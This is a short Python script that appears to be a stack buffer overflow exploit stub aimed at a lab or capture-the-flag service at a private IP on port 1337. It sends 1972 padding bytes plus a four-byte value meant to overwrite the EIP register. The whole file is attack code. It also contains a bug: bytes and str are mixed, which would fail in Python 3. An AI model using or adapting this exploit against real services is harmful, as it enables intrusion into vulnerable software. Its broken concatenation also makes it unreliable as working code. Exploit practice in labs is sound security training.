import socket

ip="10.10.102.218"
port=1337

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))

junk=b'A'*1972

eip="\xef\xbe\xad\xbe"

payload=junk+eip

s.sendall(payload)
